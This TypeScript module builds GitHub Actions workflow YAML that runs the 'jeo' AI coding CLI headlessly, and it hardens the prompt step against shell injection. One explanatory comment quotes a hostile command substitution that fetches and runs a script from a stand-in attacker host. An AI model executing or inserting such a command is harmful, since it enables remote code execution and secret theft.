/**
 * Pure GitHub Actions workflow YAML builder for `jeo routine init` (see
 * ../commands/routine.ts). No I/O here — the command layer owns reading
 * flags, resolving --out, and writing to disk; this module only turns a
 * {@link RoutineConfig} into a workflow document string, which keeps it
 * trivially unit-testable without touching the filesystem.
 *
 * Routines are the "scoped-safe" version of scheduled/triggered automation:
 * jeo-code itself never runs a scheduler, listens on a port, or accepts a
 * webhook — GitHub's own hosted runners do the triggering, and the generated
 * workflow just installs jeo-code and runs `jeo "<prompt>" -p` (the existing
 * headless one-shot mode, see launch/flags.ts) on their infrastructure. This
 * is how the workflow "runs without your laptop" with zero new attack
 * surface inside jeo-code's own process.
 */

export type RoutineTrigger = "schedule" | "issues" | "pull_request";

export interface RoutineConfig {
  /** Workflow display name, e.g. "jeo nightly triage". */
  name: string;
  /** Which GitHub event fires the routine. */
  trigger: RoutineTrigger;
  /** Cron expression, REQUIRED when trigger === "schedule" (e.g. "0 7 * * *"). Ignored otherwise. */
  cron?: string;
  /** The natural-language task/goal text passed to `jeo "<prompt>" -p`. */
  prompt: string;
  /** Anthropic/OpenAI/etc — which env var the workflow expects as a repo secret. Default "ANTHROPIC_API_KEY". */
  apiKeyEnvVar?: string;
  /** true = the workflow opens a PR with any changes (safe default); false = commits directly to the CURRENT branch. Default true. */
  openPr?: boolean;
}

/** Build the `on:` block for `config.trigger`. `workflow_dispatch` is always
 *  included alongside the primary trigger so a human can manually run the
 *  routine on demand (e.g. to test it) regardless of what fires it
 *  automatically. Throws when `trigger === "schedule"` and no cron was given
 *  — a missing cron on a schedule trigger is a caller contract violation, so
 *  this fails loud instead of emitting a broken/empty schedule block. */
function renderTriggerBlock(config: RoutineConfig): string {
  switch (config.trigger) {
    case "schedule": {
      if (!config.cron) {
        throw new Error("renderRoutineWorkflow: config.cron is required when trigger is 'schedule'.");
      }
      const cron = config.cron.replace(/'/g, "''");
      return [
        "on:",
        "  schedule:",
        `    - cron: '${cron}'`,
        "  workflow_dispatch: {}",
      ].join("\n");
    }
    case "issues":
      return [
        "on:",
        "  issues:",
        "    types: [opened, labeled]",
        "  workflow_dispatch: {}",
      ].join("\n");
    case "pull_request":
      return [
        "on:",
        "  pull_request:",
        "    types: [opened, synchronize]",
        "  workflow_dispatch: {}",
      ].join("\n");
    default: {
      // Exhaustiveness guard: a new RoutineTrigger member without a case
      // above fails typecheck here rather than silently falling through.
      const exhaustive: never = config.trigger;
      throw new Error(`renderRoutineWorkflow: unknown trigger '${String(exhaustive)}'.`);
    }
  }
}

/** Build the step that runs `jeo "$JEO_ROUTINE_PROMPT" -p` headlessly. The
 *  prompt is passed through an `env:` var and referenced (never inlined
 *  directly into the shell script text) — GitHub's own Actions-hardening
 *  guidance: a `run:` script is executed by bash, and bash performs
 *  `$(...)`/backtick command substitution on ANY text inside a double-quoted
 *  string, INCLUDING one built via naive string interpolation of a value the
 *  workflow author doesn't fully control (a copy-pasted prompt, or one later
 *  templated from untrusted input like an issue body). Routing the value
 *  through `env:` means bash expands `$JEO_ROUTINE_PROMPT` as inert DATA —
 *  its contents are never re-parsed as shell syntax, so an embedded
 *  `$(curl evil/exfil.sh|bash)` cannot execute even though this step's
 *  `env:` block also carries the API-key secret. */
function renderJeoRunStep(config: RoutineConfig, apiKeyVar: string): string {
  return [
    "      - name: Run jeo (headless)",
    '        run: jeo "$JEO_ROUTINE_PROMPT" -p',
    "        env:",
    `          ${apiKeyVar}: \${{ secrets.${apiKeyVar} }}`,
    "          JEO_ROUTINE_PROMPT: " + JSON.stringify(config.prompt),
  ].join("\n");
}

/** `openPr !== false` path: open (or update) a PR with whatever changes the
 *  jeo step made, instead of committing straight to the triggering branch.
 *  create-pull-request is a documented no-op when the working tree is clean
 *  after the previous step, so this is safe to run unconditionally — no
 *  diff-check step needed before it. */
function renderOpenPrStep(config: RoutineConfig): string {
  const commitMessage = `jeo routine: ${config.name}`;
  return [
    "      # peter-evans/create-pull-request no-ops when there's nothing to commit",
    "      # (clean working tree after the jeo step above) — safe to run every time.",
    "      - name: Open PR with any changes",
    "        uses: peter-evans/create-pull-request@v6",
    "        with:",
    "          branch: jeo-routine/${{ github.run_id }}",
    `          commit-message: ${JSON.stringify(commitMessage)}`,
    `          title: ${JSON.stringify(commitMessage)}`,
    `          body: ${JSON.stringify(`Automated changes from the "${config.name}" jeo routine.`)}`,
  ].join("\n");
}

/** `openPr === false` path: commit any changes straight to the branch the
 *  workflow ran on. The `git diff --staged --quiet ||` short-circuit makes
 *  an empty diff a silent no-op instead of a failing `git commit` (nothing
 *  to commit exits non-zero on a clean tree). */
function renderDirectCommitSteps(config: RoutineConfig): string {
  const commitMessage = `jeo routine: ${config.name}`;
  return [
    "      - name: Configure git identity",
    "        run: |",
    '          git config user.name "github-actions[bot]"',
    '          git config user.email "github-actions[bot]@users.noreply.github.com"',
    "",
    "      - name: Commit any changes directly to this branch",
    "        run: |",
    "          git add -A",
    `          git diff --staged --quiet || (git commit -m ${JSON.stringify(commitMessage)} && git push)`,
  ].join("\n");
}

/**
 * Render a complete GitHub Actions workflow YAML document that runs
 * `jeo "<prompt>" -p` headlessly on GitHub's hosted runners, triggered by
 * `config.trigger` (plus an always-present `workflow_dispatch` for manual
 * runs). No YAML library is used — the shape is fixed and simple enough to
 * hand-build as a string, matching this repo's zero-dependency policy.
 *
 * Throws if `config.trigger === "schedule"` and `config.cron` is missing
 * (see {@link renderTriggerBlock}); does not otherwise validate cron syntax
 * — that is {@link validateCron}'s job, run by the command layer before this
 * is ever called.
 */
export function renderRoutineWorkflow(config: RoutineConfig): string {
  const triggerBlock = renderTriggerBlock(config); // throws first on schedule+no cron
  const apiKeyVar = config.apiKeyEnvVar ?? "ANTHROPIC_API_KEY";
  const openPr = config.openPr !== false;
  const quotedName = `'${config.name.replace(/'/g, "''")}'`;

  const lines: string[] = [
    "# Generated by `jeo routine init` (see `jeo routine init --help`).",
    "# Safe to hand-edit afterward — `jeo routine init` will refuse to",
    "# overwrite this file again without --force.",
    `name: ${quotedName}`,
    "",
    triggerBlock,
    "",
    "permissions:",
    "  contents: write",
    "  pull-requests: write",
    "",
    "jobs:",
    "  jeo-routine:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - name: Checkout",
    "        uses: actions/checkout@v4",
    "        with:",
    "          fetch-depth: 0",
    "",
    "      - name: Setup Bun",
    "        uses: oven-sh/setup-bun@v2",
    "        with:",
    '          bun-version: "1.3.14"',
    "",
    "      - name: Install jeo-code",
    "        run: bun install -g jeo-code",
    "",
    renderJeoRunStep(config, apiKeyVar),
    "",
    openPr ? renderOpenPrStep(config) : renderDirectCommitSteps(config),
    "",
  ];
  return lines.join("\n");
}

/**
 * Lightweight cron sanity check: exactly 5 whitespace-separated fields, each
 * matching a permissive `*` or `[0-9,-/]+` shape. NOT a full cron-grammar
 * validator (it doesn't understand step-value combos like "star-slash-15",
 * months/weekdays, or range bounds) — just enough to catch an obviously
 * malformed string (wrong field count, stray letters/words) before it
 * reaches GitHub's own (stricter) parser at workflow-run time. Used by the
 * command layer; {@link renderRoutineWorkflow} does not re-validate syntax.
 */
export function validateCron(cron: string): boolean {
  const fields = cron.trim().split(/\s+/);
  if (fields.length !== 5) return false;
  return fields.every(f => /^([*]|[0-9,\-\/]+)$/.test(f));
}
